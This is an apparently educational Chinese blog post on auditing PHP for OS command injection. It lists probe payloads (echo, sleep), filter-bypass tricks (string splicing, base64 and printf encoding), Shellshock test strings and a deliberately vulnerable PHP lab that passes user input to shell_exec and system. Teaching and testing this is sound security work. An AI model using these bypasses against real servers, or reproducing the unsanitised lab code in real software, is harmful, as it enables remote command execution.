@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="有些时候，应用程序需要调用外部程序，这个时候就需要用到操作系统命令执行了． 涉及的函数 system exec passthru shell_exec  `` 反引号本质是调用shell_exec   当然，执行命令的办法并不是只能用php内置的函数，比如COM组件．   自动化检测工具commix 漏洞原理在网站功能的实现中，可能需要直接调用操作系统命令，一般是为了调用外部程序，这种情况比较少，">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计之命令执行">
+<meta property="og:url" content="http://hl0rey.github.io/2018/02/19/代码审计之命令执行/index.html">
+<meta property="og:site_name" content="hl0rey&#39;s blog">
+<meta property="og:description" content="有些时候，应用程序需要调用外部程序，这个时候就需要用到操作系统命令执行了． 涉及的函数 system exec passthru shell_exec  `` 反引号本质是调用shell_exec   当然，执行命令的办法并不是只能用php内置的函数，比如COM组件．   自动化检测工具commix 漏洞原理在网站功能的实现中，可能需要直接调用操作系统命令，一般是为了调用外部程序，这种情况比较少，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-02-19T10:15:33.946Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计之命令执行">
+<meta name="twitter:description" content="有些时候，应用程序需要调用外部程序，这个时候就需要用到操作系统命令执行了． 涉及的函数 system exec passthru shell_exec  `` 反引号本质是调用shell_exec   当然，执行命令的办法并不是只能用php内置的函数，比如COM组件．   自动化检测工具commix 漏洞原理在网站功能的实现中，可能需要直接调用操作系统命令，一般是为了调用外部程序，这种情况比较少，">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://hl0rey.github.io/2018/02/19/代码审计之命令执行/"/>
+
+
+
+
+
+  <title>代码审计之命令执行 | hl0rey's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">hl0rey's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/19/代码审计之命令执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hl0rey">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hl0rey's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">代码审计之命令执行</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-19T15:36:11+08:00">
+                2018-02-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/code/" itemprop="url" rel="index">
+                    <span itemprop="name">code</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <pre><code>有些时候，应用程序需要调用外部程序，这个时候就需要用到操作系统命令执行了．
+</code></pre><h3 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h3><ul>
+<li>system</li>
+<li>exec</li>
+<li>passthru</li>
+<li><p>shell_exec</p>
+</li>
+<li><p>``</p>
+<pre><code>反引号本质是调用shell_exec
+</code></pre><p>  当然，执行命令的办法并不是只能用php内置的函数，比如COM组件．</p>
+</li>
+</ul>
+<h3 id="自动化检测工具"><a href="#自动化检测工具" class="headerlink" title="自动化检测工具"></a>自动化检测工具</h3><pre><code>commix
+</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><pre><code>在网站功能的实现中，可能需要直接调用操作系统命令，一般是为了调用外部程序，这种情况比较少，但还是存在的，为了执行命令而调用系统命令的基本不存在，比如，要调用一个程序来压缩图片，或者识别二维码。
+
+而操作系统的shell特性是允许同时执行多条命令的，依赖特殊的符号来声明有多条命令。Linux下是 | || &amp; &amp;&amp; ;$(shell命令) 还有反引号“ ` ”和$(shell命令)，用它包裹的字符串会被当作系统命令执行，这在php里和linux shell里是一致的。Windows下不支持反引号，别的符号都支持。
+</code></pre><h3 id="漏洞常见类型"><a href="#漏洞常见类型" class="headerlink" title="漏洞常见类型"></a>漏洞常见类型</h3><pre><code>代码层过滤不严
+系统漏洞
+第三方组件(例如 COM)
+</code></pre><h3 id="命令注入的判断方法："><a href="#命令注入的判断方法：" class="headerlink" title="命令注入的判断方法："></a>命令注入的判断方法：</h3><pre><code>分两种情况，有点像sql 注入，一种是有回显的命令执行，一种是没有回显的命令执行。
+有回显的命令执行判断起来十分简单，让命令额外输出一段十分特别的字符串，也就是说，正常不该输出这个字符串，例如afagagnjdghsuiiebgibqkio ，短一点就可以，这里只是举个例子。发送请求后，观察页面有没有出现这个字符串，如果出现了，也就是命令执行成功了。
+对于没有回显的，一可以基于响应时间来判断，比如在linux下 可以执行 sleep 5 ，睡眠任意的秒数，如果相应时间明显变长，如果不是延迟的锅，则可以判断是否存在命令注入。Windows下执行ping -n 127.0.0.1 &gt; 1 (大约五秒钟)，也可以用来判断。二是可以基于服务器的行为，用命令注入让服务器作出一个动作，比如linux可以 wget 一个ip地址或者网站或者是ping一个地址等，ip地址是你可以控制的网站，然后查看访问记录，如果有访问记录就可以认为存在命令注入，windows下用ping。
+</code></pre><h3 id="测试步骤："><a href="#测试步骤：" class="headerlink" title="测试步骤："></a>测试步骤：</h3><h4 id="1-安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。"><a href="#1-安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。" class="headerlink" title="1.安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。"></a>1.安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。</h4><p>Payload：<br>1）有回显的<br>| echo test 管道符，把前一个命令的输出作为后一个命令的输入<br>; echo test 分号表示一个命令的结束<br>-1 || echo test 此处逻辑运算符或，只有前面的命令执行失败才能执行后面的命令，所以这地方要故意把或符号前面的参数弄错，导致命令无法正常执行。<br>&amp; echo test<br>&amp;&amp; echo test 这两个与运算必须保证前一个命令能正常执行<br>2）无回显的<br>| sleep 5<br>; sleep 5<br>-1 || sleep 5<br>&amp; sleep 5<br>&amp;&amp; sleep 5<br>用别的判断方法只要把sleep 5 换成其他的命令就行了</p>
+<h4 id="2-安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了"><a href="#2-安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了" class="headerlink" title="2.安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了"></a>2.安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了</h4><p>例如使用 $(echo 2)</p>
+<h4 id="3-执行黑名单函数"><a href="#3-执行黑名单函数" class="headerlink" title="3.执行黑名单函数"></a>3.执行黑名单函数</h4><p>A）大小写绕过</p>
+<pre><code>Linux？不存在的
+操作系统特性，linux对大小写敏感，windows相反。
+Windows下可以用大小写来绕过比如把echo命令写成成Echo ECho。
+</code></pre><p>B）字符串拼接来执行命令</p>
+<pre><code>例如，执行echo
+a=&quot;ec&quot;;b=&quot;ho&quot;;$a$b 1;
+a=&apos;ec&apos;;b=&apos;ho&apos;;$a$b 1;
+a=&apos;ec&apos;&amp;b=&apos;ho&apos;&amp;$a$b 1;
+a=&apos;ec&apos;&amp;&amp;b=&apos;ho&apos;&amp;&amp;$a$b 1;
+`a=’ec’` `b=’ho’` `$a$b` 用反引号的，这个不常见
+</code></pre><p>C）编码绕过</p>
+<pre><code>编码这块我绕的头疼，先这样吧。
+Linux编码的命令有base64，#（用法：（进制数#数值）），或者用ascii码
+|| base64 echo | base64 -d 
+|| Cg== | base64 -d
+其他的类似只要把符合换换，命令换换
+进制转换来拼接命令非常有限，linux shell只能比较方便的最高支持16进制一下的转化，理论上来说只能执行由123456789abcdef 组成的命令（有待考证）
+Ascii码非常好用，一种是用printf 一种是用tr和od来结合实现，例如，
+字符转化为ascii码  echo &quot;A&quot;| tr -d &quot;\n&quot; | od -An -t dC
+分号可以替换为其他符号，下面这条命令会输出echo
+printf \\x`printf %x 101` ; printf \\x`printf %x 99`; printf \\x`printf %x 104`; printf \\x`printf %x 111` 
+
+Windows cmd比较垃圾，好像没有什么编码
+</code></pre><h4 id="严格过滤之后的绕过"><a href="#严格过滤之后的绕过" class="headerlink" title="严格过滤之后的绕过"></a>严格过滤之后的绕过</h4><pre><code>经过安全等级8的严格过滤，看似已经不可能注入命令了。但是实际上还是有办法注入命令的。这里提到两种办法，一是宽字节注入，二是软件漏洞。
+一是宽字节注入，这个我暂时先停留在设想阶段- -。
+二是软件漏洞，值得一提的漏洞有shellshock和imagemagick解析漏洞
+Shellshock：
+                1).CVE-2014-6271 测试方式:
+                  env x=&apos;() { :;}; echo vulnerable&apos; bash -c &quot;echo this is a test&quot; 
+                   (2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)
+                  env -i X=&apos;;() { (a)=&gt;\&apos; bash -c &apos;echo date&apos;; cat echo
+</code></pre><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre><code>&lt;?php
+
+global $cmds;
+$cmds = &apos;&apos;;
+$servercmd = &apos;dir&apos;;
+$black = &apos;&apos;;
+
+//字符串替换函数详解
+
+//改变服务器执行的命令
+if (isset($_POST[&apos;servercmd&apos;])) {
+    $servercmd = $_POST[&apos;servercmd&apos;];
+}
+
+if ($_POST[&apos;lv&apos;] == 1) {
+//不做任何过滤
+    $cmds = $_POST[&apos;cmd&apos;];
+
+}
+if ($_POST[&apos;lv&apos;] == 2) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;,), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 3) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 4) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 5) {
+    //代码书写错误，造成的绕过，多加了个空格导致过滤函数无效
+    $cmds = str_replace(array(&apos;&amp; &apos;, &apos;| &apos;, &apos;; &apos;, &apos;|| &apos;, &apos;&amp;&amp; &apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+}
+if ($_POST[&apos;lv&apos;] == 6) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;, &apos;`&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 7) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;, &apos;`&apos;,&apos;&gt;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+
+
+if ($_POST[&apos;lv&apos;] == 8) {
+    //过滤了 # &amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \\ \x0A \xFF
+    //在特殊符号之前加了转义符号 \
+    $cmds = escapeshellcmd($_POST[&apos;cmd&apos;]);
+}
+
+//把字符串转换为小写
+if ($_POST[&apos;case&apos;]==1){
+
+    $cmds=strtolower($cmds);//转为小写
+    //strtoupper();转为大写
+    //ucfirst(); 首字母大写
+    //ucwords(); 所有单词首字母大写
+}
+
+//过滤某个命令，基于黑名单
+if (isset($_POST[&apos;black&apos;])) {
+    $black = $_POST[&apos;black&apos;];
+    $cmds = str_replace($black, &apos;&apos;, $cmds);
+}
+
+
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;style&gt;
+    div{
+    text-align: center;
+    }
+    &lt;/style&gt;
+    &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div id=&quot;center&quot;&gt;
+
+    &lt;form action=&quot;cmd.php&quot; method=&quot;post&quot;&gt;
+    &lt;div id=&quot;title&quot;&gt;命令注入&lt;/div&gt;
+    &lt;br&gt;
+    安全等级：&lt;select name=&quot;lv&quot;&gt;
+        &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;
+        &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;
+        &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;
+        &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt;
+        &lt;option value=&quot;5&quot;&gt;5&lt;/option&gt;
+        &lt;option value=&quot;6&quot;&gt;6&lt;/option&gt;
+        &lt;option value=&quot;7&quot;&gt;7&lt;/option&gt;
+        &lt;option value=&quot;8&quot;&gt;8&lt;/option&gt;
+    &lt;/select&gt;&lt;br&gt;&lt;br&gt;
+    &lt;label&gt;函数黑名单：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;black&quot;&gt;&lt;br&gt;&lt;br&gt;
+    &lt;label&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;命令：&lt;/label&gt;&lt;input type=&quot;text&quot;
+                                                                                         name=&quot;servercmd&quot;
+                                                                                         value=&quot;dir&quot;&gt;&lt;br&gt;&lt;br&gt;
+    &lt;label&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;参数：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot;
+                                                                                         value=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt;
+    &amp;nbsp;&amp;nbsp;
+    &lt;label&gt;是否开启大小写过滤：&lt;/label&gt;&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;case&quot; value=&quot;1&quot;&gt;是&lt;/label&gt;&amp;nbsp;&amp;nbsp;&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;case&quot; value=&quot;2&quot;&gt;否&lt;/label&gt;&lt;br&gt;
+    &lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+&lt;div id=&quot;result&quot;&gt;
+    &lt;?php
+    //给了默认值了，是字符串所以这了进不来，直接构造数据包的时候这地方可以做校验
+    if (!isset($_POST[&apos;lv&apos;]) or !isset($_POST[&apos;cmd&apos;])) {
+    die(&apos; &lt;span id=&quot;tip&quot;&gt;
+安全等级1没有任何过滤&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级2过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级3过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级4过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级5代码书写失误，过滤无效&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级6过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||`&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级7过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||&amp;nbsp;`&amp;nbsp;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级8使用了php的内建函数，在#&amp;nbsp;&amp;&amp;nbsp;;&amp;nbsp;`&amp;nbsp;|&amp;nbsp;*&amp;nbsp;?&amp;nbsp;~&amp;nbsp;&lt;&amp;nbsp;&gt;&amp;nbsp;^&amp;nbsp;(&amp;nbsp;)&amp;nbsp;[&amp;nbsp;]&amp;nbsp;{&amp;nbsp;}&amp;nbsp;$&amp;nbsp;\&amp;nbsp;\x0A&amp;nbsp;\xFF之前加了转移字符&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+&lt;/span&gt;&apos;);
+    }
+
+    $result = shell_exec($servercmd . &apos; &apos; . $cmds);
+    echo &apos;shell_exec output: &lt;br&gt;&apos;;
+    echo $result;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    echo &apos;system output: &lt;br&gt;&apos;;
+    system($servercmd . &apos; &apos; . $cmds, $code);
+
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;system return code: &apos;;
+    echo $code;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    exec($servercmd . &apos; &apos; . $cmds, $a, $code2);
+    echo &apos;exec output:&lt;br&gt;&apos;;
+
+    foreach ($a as $aa) {
+    echo $aa;
+    }
+
+
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;exec return code:&apos; . $code2;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    echo &apos;passthru output:&lt;br&gt;&apos;;
+    passthru($servercmd . &apos; &apos; . $cmds, $code3);
+
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;passthru return code: &apos;;
+    echo $code3;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    echo &quot;the string is:&lt;br&gt;&quot; . $cmds;
+
+    ?&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+      
+    </div>
+    
+    
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/02/19/代码审计之命令执行/">代码审计之命令执行</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 hl0rey 的个人博客">hl0rey</a></p>
+  <p><span>发布时间:</span>2018年02月19日 - 15:02</p>
+  <p><span>最后更新:</span>2018年02月19日 - 18:02</p>
+  <p><span>原始链接:</span><a href="/2018/02/19/代码审计之命令执行/" title="代码审计之命令执行">http://hl0rey.github.io/2018/02/19/代码审计之命令执行/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://hl0rey.github.io/2018/02/19/代码审计之命令执行/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/19/代码审计之代码执行/" rel="next" title="代码审计之代码执行">
+                <i class="fa fa-chevron-left"></i> 代码审计之代码执行
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">hl0rey</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#涉及的函数"><span class="nav-number">1.</span> <span class="nav-text">涉及的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自动化检测工具"><span class="nav-number">2.</span> <span class="nav-text">自动化检测工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞常见类型"><span class="nav-number">4.</span> <span class="nav-text">漏洞常见类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令注入的判断方法："><span class="nav-number">5.</span> <span class="nav-text">命令注入的判断方法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试步骤："><span class="nav-number">6.</span> <span class="nav-text">测试步骤：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。"><span class="nav-number">6.1.</span> <span class="nav-text">1.安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了"><span class="nav-number">6.2.</span> <span class="nav-text">2.安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-执行黑名单函数"><span class="nav-number">6.3.</span> <span class="nav-text">3.执行黑名单函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#严格过滤之后的绕过"><span class="nav-number">6.4.</span> <span class="nav-text">严格过滤之后的绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试代码"><span class="nav-number">7.</span> <span 